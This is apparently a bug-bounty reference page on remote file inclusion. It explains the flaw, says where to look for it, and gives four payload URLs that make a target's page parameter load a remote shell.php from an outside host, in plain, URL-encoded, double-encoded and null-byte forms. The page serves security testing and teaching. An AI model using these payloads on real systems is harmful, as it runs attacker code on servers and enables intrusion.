
## Introduction

[](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Remote%20File%20Inclusion.md#introduction)

Remote file inclusion (RFI) is an attack targeting vulnerabilities in web applications that dynamically reference external scripts.

## Where to find

[](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Remote%20File%20Inclusion.md#where-to-find)

- Any endpoint that includes a file from a web server. For example, `/index.php?page=index.html`

## How to exploit

[](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Remote%20File%20Inclusion.md#how-to-exploit)

1. Basic payload

```
http://example.com/index.php?page=http://daffa.info/shell.php
```

2. URL encoding

```
http://example.com/index.php?page=http%3A%2F%2Fdaffa.info%2Fshell.php
```

3. Double encoding

```
http://example.com/index.php?page=http%253A%252F%252Fdaffa.info%252Fshell.php
```

4. Using Null Byte (%00)

```
http://example.com/index.php?page=http://daffa.info/shell.php%00
```

## References

[](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Remote%20File%20Inclusion.md#references)

- [payloadbox](https://github.com/payloadbox/rfi-lfi-payload-list)

